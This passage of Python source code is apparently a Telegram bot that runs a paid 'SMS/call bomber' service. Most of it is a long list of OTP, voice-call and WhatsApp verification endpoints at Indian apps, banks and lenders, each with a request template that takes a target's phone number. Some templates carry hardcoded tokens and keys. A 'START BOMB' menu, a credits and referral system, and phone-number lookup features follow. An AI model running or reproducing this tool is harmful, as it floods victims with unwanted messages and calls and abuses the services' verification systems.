    {"name": "Swiggy Call Verification", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Myntra Voice Call", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Flipkart Voice Call", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Amazon Voice Call", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&action=voice_otp"},
    {"name": "Paytm Voice Call", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Zomato Voice Call", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&type=voice"},
    {"name": "MakeMyTrip Voice Call", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Goibibo Voice Call", "url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Ola Voice Call", "url": "https://api.olacabs.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Uber Voice Call", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "KPN WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8"}, "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'},
    {"name": "Foxy WhatsApp", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}'},
    {"name": "Lenskart SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'},
    {"name": "NoBroker SMS", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&countryCode=IN"},
    {"name": "PharmEasy SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Wakefit SMS", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Byju's SMS", "url": "https://api.byjus.com/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Hungama OTP", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'},
    {"name": "Meru Cab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"mobile_number={phone}"},
    {"name": "Doubtnut", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'},
    {"name": "Snapmint", "url": "https://api.snapmint.com/v1/public/sign_up", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Housing.com", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'},
    {"name": "RentoMojo", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'},
    {"name": "Netmeds", "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Nykaa", "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa"},
    {"name": "RummyCircle", "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}'},
    {"name": "Animall", "url": "https://animall.in/zap/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'},
    {"name": "Cosmofeed", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'},
    {"name": "Aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}}'},
    {"name": "TrulyMadly", "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","locale":"IN"}}'},
    {"name": "Apna", "url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","hash_type":"play_store"}}'},
    {"name": "Swipe", "url": "https://app.getswipe.in/api/user/mobile_login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","resend":true}}'},
    {"name": "Country Delight", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","platform":"Android","mode":"new_user"}}'},
    {"name": "Rapido", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "BetterHalf", "url": "https://api.betterhalf.ai/v2/auth/otp/send/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","isd_code":"91"}}'},
    {"name": "Charzer", "url": "https://api.charzer.com/auth-service/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","appSource":"CHARZER_APP"}}'},
    {"name": "Mpokket", "url": "https://web-api.mpokket.in/registration/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "splexxo_bomb", "url": "https://splexxo1-2api.vercel.app/bomb?phone={phone}&key=SPLEXXO", "method": "GET", "headers": {}, "data": None},
    {"name": "agrevolution_otp2", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"mobile_number": phone, "client_id": "kisan-app"})},
    {"name": "breeze_session2", "url": "https://api.breeze.in/session/start", "method": "POST", "headers": {"Content-Type": "application/json", "x-device-id": "A1pKVEDhlv66KLtoYsml3", "x-session-id": "MUUdODRfiL8xmwzhEpjN8"}, "data": lambda phone: json.dumps({"phoneNumber": phone, "authVerificationType": "otp", "device": {"id": "A1pKVEDhlv66KLtoYsml3", "platform": "Chrome", "type": "Desktop"}, "countryCode": "+91"})},
    {"name": "jockey_whatsapp2", "url": "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=true", "method": "GET", "headers": {"accept": "*/*", "user-agent": "Mozilla/5.0", "origin": "https://www.jockey.in", "referer": "https://www.jockey.in/"}, "data": None},
    {"name": "penpencil_pw2", "url": "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0", "method": "POST", "headers": {"accept": "*/*", "content-type": "application/json", "origin": "https://www.pw.live"}, "data": lambda phone: json.dumps({"mobile": phone, "countryCode": "+91", "subOrgId": "SUB-PWLI000"})},
    {"name": "zoho_store2", "url": "https://store.zoho.com/api/v1/partner/affiliate/sendotp?mobilenumber=91{phone}&countrycode=IN&country=india", "method": "POST", "headers": {"Accept": "*/*", "Content-Length": "0", "Origin": "https://www.zoho.com"}, "data": None},
    {"name": "kpn_fresh2", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3", "method": "POST", "headers": {"x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587", "Content-Type": "application/json; charset=UTF-8"}, "data": lambda phone: json.dumps({"phone_number": {"country_code": "+91", "number": phone}})},
    {"name": "aditya_birla2", "url": "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"MobileNumber={phone}&functionality=signup"},
    {"name": "muthoot_finance2", "url": "https://www.muthootfinance.com/smsapi.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"mobile={phone}&pin=XjtYYEdhP0haXjo3"},
    {"name": "gopaysense2", "url": "https://api.gopaysense.com/users/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone": phone})},
    {"name": "iifl2", "url": "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"apply_for=18&full_name=Adnvs+Signh&mobile_number={phone}&terms_and_condition=1&_drupal_ajax=1"},
    {"name": "bankopen2", "url": "https://v2-api.bankopen.co/users/register/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"username": phone, "is_open_capital": 1})},
    {"name": "tata_capital_retail2", "url": "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"header": {"authToken": "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==", "identifier": "nli"}, "body": {"mobileNumber": phone}})},
    {"name": "tradeindia2", "url": "https://apis.tradeindia.com/app_login_api/login_app", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"mobile": f"+91{phone}"})},
    {"name": "khatabook_app2", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"x-kb-app-name": "khatabook", "Content-Type": "application/json; charset=UTF-8"}, "data": lambda phone: json.dumps({"phone": phone, "country_code": "+91", "app_signature": "wk+avHrHZf2"})},
    {"name": "orange_health2", "url": "https://accounts.orangehealth.in/api/v1/user/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"mobile_number": phone, "customer_auto_fetch_message": True})},
    {"name": "jobhai2", "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}, "data": lambda phone: json.dumps({"phone": phone})},
    {"name": "mconnect2", "url": "https://mconnect.isteer.co/mconnect/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"mobile_number": f"+91{phone}"})},
    {"name": "astrosage_varta2", "url": "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&jsonpcall=1&fromresend=0", "method": "GET", "headers": {}, "data": None},
    {"name": "spinny2", "url": "https://api.spinny.com/api/c/user/otp-request/v3/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"contact_number": phone, "whatsapp": False, "code_len": 4, "expected_action": "login"})},
    {"name": "dream112", "url": "https://www.dream11.com/auth/passwordless/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"channel": "sms", "flow": "SIGNUP", "phoneNumber": phone, "templateName": "default"})},
    {"name": "citymall2", "url": "https://citymall.live/api/cl-user/auth/get-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone_number": phone})},
    {"name": "codfirm2", "url": "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber={phone}&storeUrl=bellavita1.myshopify.com", "method": "GET", "headers": {}, "data": None},
    {"name": "oyo2", "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en", "method": "POST", "headers": {"Content-Type": "text/plain;charset=UTF-8"}, "data": lambda phone: json.dumps({"phone": phone, "country_code": "+91", "nod": 4})},
    {"name": "myma2", "url": "https://portal.myma.in/custom-api/auth/generateotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"countrycode": "+91", "mobile": f"91{phone}", "is_otpgenerated": False, "app_version": "-1"})},
    {"name": "freedo_rentals2", "url": "https://api.freedo.rentals/customer/sendOtpForSignUp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"email_id": "cokiwav528@avastu.com", "first_name": "Haiii", "mobile_number": phone})},
    {"name": "licious2", "url": "https://www.licious.in/api/login/signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone": phone, "captcha_token": None})},
    {"name": "bisleri2", "url": "https://apis.bisleri.com/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"email": "abfhhfhcd@gmail.com", "mobile": phone})},
    {"name": "evital2", "url": "https://www.evitalrx.in:4000/v3/login/signup_sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"pharmacy_name": "hfhfjfgfhkf", "mobile": phone, "referral_code": "", "email_id": "jhvd@gmail.com", "zip_code": "110086", "device_id": "f2cea99f-381d-432d-bd27-02bc6678fa93", "app_version": "desktop", "device_name": "Chrome"})},
    {"name": "quickride2", "url": "https://pwa.getquickride.com/rideMgmt/probableuser/create/new", "method": "POST", "headers": {"APP-TOKEN": "s16-q9fz-jy3p-rk", "Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"contactNo={phone}&countryCode=%2B91&appName=Quick%20Ride"},
    {"name": "clovia2", "url": "https://www.clovia.com/api/v4/signup/check-existing-user/?phone={phone}&isSignUp=true", "method": "GET", "headers": {}, "data": None},
    {"name": "kwikfix2", "url": "https://admin.kwikfixauto.in/api/auth/signupotp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone": phone})},
    {"name": "brevistay2", "url": "https://www.brevistay.com/cst/app-api/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"is_otp": 1, "is_password": 0, "mobile": phone})},
    {"name": "hourlyrooms2", "url": "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone": phone})},
    {"name": "madrasmandi2", "url": "https://api.madrasmandi.in/api/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryBBzDmO8qIRlvPMMZ"}, "data": lambda phone: f'------WebKitFormBoundaryBBzDmO8qIRlvPMMZ\r\nContent-Disposition: form-data; name="phone"\r\n\r\n+91{phone}\r\n------WebKitFormBoundaryBBzDmO8qIRlvPMMZ\r\nContent-Disposition: form-data; name="scope"\r\n\r\nclient\r\n------WebKitFormBoundaryBBzDmO8qIRlvPMMZ--\r\n'},
    {"name": "bharatloan2", "url": "https://www.bharatloan.com/login-sbm", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"mobile={phone}&current_page=login&is_existing_customer=2"},
    {"name": "pagarbook2", "url": "https://api.pagarbook.com/api/v5/auth/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone": phone, "language": 1})},
    {"name": "vahak2", "url": "https://api.vahak.in/v1/u/o_w", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone_number": phone, "scope": 0, "is_whatsapp": False})},
    {"name": "redcliffelabs2", "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone_number": phone, "short": True})},
    {"name": "ixigo2", "url": "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp", "method": "POST", "headers": {"apikey": "ixiweb\u00212$", "Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"sixDigitOTP=true&resendOnCall=false&prefix=%2B91&resendOnWhatsapp=false&phone={phone}"},
    {"name": "55club2", "url": "https://api.55clubapi.com/api/webapi/SmsVerifyCode", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}, "data": lambda phone: json.dumps({"phone": f"91{phone}", "codeType": 1, "language": 0})},
    {"name": "zerodha2", "url": "https://zerodha.com/account/registration.php", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}, "data": lambda phone: json.dumps({"mobile": phone, "source": "zerodha", "partner_id": ""})},
    {"name": "testbook2", "url": "https://api.testbook.com/api/v2/mobile/signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"mobile": phone, "signupDetails": {"page": "HomePage"}})},
    {"name": "medibuddy2", "url": "https://loginprod.medibuddy.in/unified-login/user/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"source": "medibuddyInWeb", "platform": "medibuddy", "phonenumber": phone, "flow": "Retail-Login-Home-Flow"})},
    {"name": "tradeindia_reg2", "url": "https://api.tradeindia.com/home/registration/", "method": "POST", "headers": {"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarypzpW5AB7AKLEX4iX"}, "data": lambda phone: f'------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="country_code"\r\n\r\n+91\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="phone"\r\n\r\n{phone}\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="whatsapp_update"\r\n\r\ntrue\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="name"\r\n\r\natyug\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="email"\r\n\r\ndrhufj@gmail.com\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="terms"\r\n\r\ntrue\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX--\r\n'},
    {"name": "beyoung2", "url": "https://www.beyoung.in/api/sendOtp.json", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}, "data": lambda phone: json.dumps({"username": phone, "username_type": "mobile", "service_type": 0})},
    {"name": "wrogn2", "url": "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp", "method": "POST", "headers": {"action": "sendOTP", "Content-Type": "application/json"}, "data": lambda phone: json.dumps({"username": f"+91{phone}", "type": "mobile", "domain": "wrogn.com"})},
    {"name": "medkart2", "url": "https://app.medkart.in/api/v1/auth/requestOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"mobile_no": phone})},
    {"name": "coverfox2", "url": "https://www.coverfox.com/otp/send/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"csrfmiddlewaretoken=5YvA2IoBS6KRJrzV93ysh0VRRvT7CagG3DO7TPu5TwZ9161xVWsEsHzL6mYfvnIA&contact={phone}"},
    {"name": "woodenstreet2", "url": "https://www.woodenstreet.com/index.php?route=account/forgotten_popup", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"token=&firstname=Aartd&telephone={phone}&pincode=110086&city=NORTH+WEST+DELHI&state=DELHI&cxid=NTUxOTE0&email=hdftysdrt%40gmail.com&password=%40Abvdthfuj&pagesource=onload&login=2&userput_otp="},
    {"name": "gomechanic2", "url": "https://gomechanic.app/api/v2/send_otp", "method": "POST", "headers": {"Authorization": "725ea1b774c3558a8ec01a8405334a6e50e1e822d9549d84b36a1d3bb9478a27", "Content-Type": "application/json"}, "data": lambda phone: json.dumps({"number": phone, "source": "website", "random_id": "K6z9b"})},
    {"name": "lovelocal2", "url": "https://homedeliverybackend.mpaani.com/auth/send-otp", "method": "POST", "headers": {"client-code": "vulpix", "Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone_number": phone, "role": "CUSTOMER"})},
    {"name": "tyreplex2", "url": "https://www.tyreplex.com/includes/ajax/gfend.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"perform_action=sendOTP&mobile_no={phone}&action_type=order_login"},
    {"name": "udaan2", "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"}, "data": lambda phone: f"mobile={phone}"},
    {"name": "xylem2", "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"mobile": phone, "countryCode": "+91", "firstName": "Anant Ambani"})},
    {"name": "nobroker_v12", "url": "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"phone=%2B91{phone}"},
    {"name": "vidyakul2", "url": "https://vidyakul.com/signup-otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"phone={phone}"},
    {"name": "woodenstreet_register2", "url": "https://api.woodenstreet.com/api/v1/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"firstname": "Astres", "email": "abcdhbdgud77dd@gmail.com", "telephone": phone, "password": "abcd@gmail.com#%fd", "isGuest": 0, "pincode": "110001"})},
]

# Combine all APIs into one list
APIS = OLD_APIS + NEW_APIS + ULTIMATE_APIS

# ------------------ SANITIZATION (FIX MISSING NAMES) ------------------
for i, api in enumerate(APIS):
    if "name" not in api:
        url = api.get("url", "")
        if url:
            match = re.search(r'https?://([^/]+)', url)
            if match:
                domain = match.group(1).replace('www.', '')
                name = f"{domain}_{i}"
            else:
                name = f"api_{i}"
        else:
            name = f"unknown_api_{i}"
        api["name"] = name
    if "method" not in api:
        api["method"] = "GET"
    if "headers" not in api:
        api["headers"] = {}
    if "data" not in api:
        api["data"] = None

# Remove duplicates (based on name+url)
seen = set()
unique_apis = []
for api in APIS:
    key = (api["name"], api["url"])
    if key not in seen:
        seen.add(key)
        unique_apis.append(api)
APIS = unique_apis

print(f"✅ Loaded {len(APIS)} unique APIs")

# ================= PAGINATED REPLY KEYBOARD =================
user_page = {}

def get_main_keyboard(user_id):
    page = user_page.get(user_id, 1)
    keyboard = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=False)
    if page == 1:
        buttons = [
            "🟢 START BOMB ⚔️", "🔴 STOP BOMB ⏹️",
            "💚 MY CREDITS 💰", "✅ DAILY BONUS 🎁",
            "▶️ NEXT PAGE"
        ]
        if user_id in ADMIN_IDS:
            buttons.insert(4, "👑 ADMIN PANEL ⚙️")
        keyboard.add(*buttons)
    elif page == 2:
        buttons = [
            "🟢 REDEEM CODE 🎟️", "🎫 REDEEM PANEL CODE",
            "📊 MY STATS 📈", "❓ HELP 🆘",
            "🆔 MY ID 👤", "👑 OWNER INFO ℹ️",
            "🤖 BOT INFO 📡", "🔍 NUMBER INFO 📞",
            "🆔 TG ID TO NUMBER 📱", "🔍 USERNAME TO ID 👤",
            "▶️ PAGE 3 ➡️", "🏠 HOME"
        ]
        keyboard.add(*buttons)
    else:  # page 3
        buttons = [
            "🎮 MY PANELS 📋", "💼 ADD PANEL ➕",
            "💰 PANEL BALANCE", "🎁 RECHARGE PANEL",
            "📊 PANEL STATS", "🔗 MY REFERRAL",
            "🏆 LEADERBOARD", "◀️ BACK PAGE",
            "🏠 HOME"
        ]
        keyboard.add(*buttons)
    return keyboard

def get_admin_keyboard():
    keyboard = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=False)
    buttons = [
        "📊 STATS 📈", "👥 USERS LIST 📋",
        "🎟️ GEN CODE 💚", "🎫 GEN PANEL CODE",
        "🚫 BAN USER ⛔", "✅ UNBAN USER 🔓",
        "💰 ADD CREDITS ➕", "♾️ UNLIMITED CREDITS 💚",
        "🔋 RECHARGE PANEL (ADMIN)", "🔍 FIND USER 🔎",
        "📜 BANNED LIST 🚫", "🔄 RESET ALL CREDITS 💢",
        "➕ ADD PROTECTED", "➖ REMOVE PROTECTED",
        "📋 PROTECTED LIST", "📢 BROADCAST",
        "🔙 BACK TO MAIN 🏠"
    ]
    keyboard.add(*buttons)
    return keyboard

# ================= START COMMAND =================
@bot.message_handler(commands=['start'])
def start_command(m):
    user_id = m.chat.id
    bot.send_chat_action(user_id, 'typing')
    time.sleep(1.2)

    bot.send_message(user_id, "🔄 **LOADING YOUR DASHBOARD...**", parse_mode="Markdown")
    time.sleep(0.8)

    # referral code
    args = m.text.split()
    if len(args) > 1:
        ref_code = args[1]
        process_referral(user_id, ref_code)

    data = load_data()
    if str(user_id) in data.get("banned", []):
        bot.send_message(user_id, "🚫 YOU ARE BANNED!")
        return
    user = get_user(user_id)
    data["users"][str(user_id)]["username"] = m.from_user.username or ""
    data["users"][str(user_id)]["first_name"] = m.from_user.first_name or ""
    save_data(data)

    user_page[user_id] = 1
    first_name = m.from_user.first_name or "User"
    username = m.from_user.username or "Not set"
    credits = user['credits']
    referral_count = get_referral_count(user_id)
    daily_emoji = get_daily_emoji()

    dashboard = f"""
🎉 **WELCOME TO OUR INFORMATION BOT** 🎉

HEY **{first_name.upper()}** 🔥

📊 **YOUR DASHBOARD**

💰 **CREDITS** » `{credits}`
🎁 **DAILY SPIN** » +5 FREE (1-10 actual)
⭐ **PREMIUM** » CO SEARCH ACTIVE
👤 **USERNAME** » @{username}
🔗 **REFERRALS** » {referral_count}

💡 /help — SHOW ALL FEATURES

👑 **DEV** » @OFFICIAL_ASH_X1
    """
    bot.send_message(user_id, dashboard, parse_mode="Markdown", reply_markup=get_main_keyboard(user_id))

@bot.message_handler(commands=['admin'])
def admin_panel(m):
    if m.chat.id not in ADMIN_IDS:
        bot.send_message(m.chat.id, "❌ You are not authorized!")
        return
    bot.send_message(m.chat.id, "👑 **ADMIN CONTROL PANEL** 👑\n\nSelect an option:", parse_mode="Markdown", reply_markup=get_admin_keyboard())

# ================= STATE FOR USER INPUTS =================
user_states = {}
admin_states = {}

# ================= HANDLE MAIN KEYBOARD BUTTONS =================
@bot.message_handler(func=lambda m: m.text in [
    "🟢 START BOMB ⚔️", "🔴 STOP BOMB ⏹️", "💚 MY CREDITS 💰", "✅ DAILY BONUS 🎁",
    "🟢 REDEEM CODE 🎟️", "🎫 REDEEM PANEL CODE", "📊 MY STATS 📈", "❓ HELP 🆘", "🆔 MY ID 👤",
    "👑 OWNER INFO ℹ️", "🤖 BOT INFO 📡", "🔍 NUMBER INFO 📞", "🆔 TG ID TO NUMBER 📱",
    "🔍 USERNAME TO ID 👤", "👑 ADMIN PANEL ⚙️", "▶️ NEXT PAGE", "◀️ BACK PAGE",
    "▶️ PAGE 3 ➡️", "🎮 MY PANELS 📋", "💼 ADD PANEL ➕", "💰 PANEL BALANCE",
    "🎁 RECHARGE PANEL", "📊 PANEL STATS", "🔗 MY REFERRAL", "🏆 LEADERBOARD",
    "🏠 HOME"
])
def handle_main_buttons(m):
    user_id = m.chat.id
    text = m.text

    if text == "🏠 HOME":
        user_page[user_id] = 1
        bot.send_message(user_id, "🏠 **MAIN MENU**", parse_mode="Markdown", reply_markup=get_main_keyboard(user_id))
        return

    if text == "▶️ NEXT PAGE":
        user_page[user_id] = 2
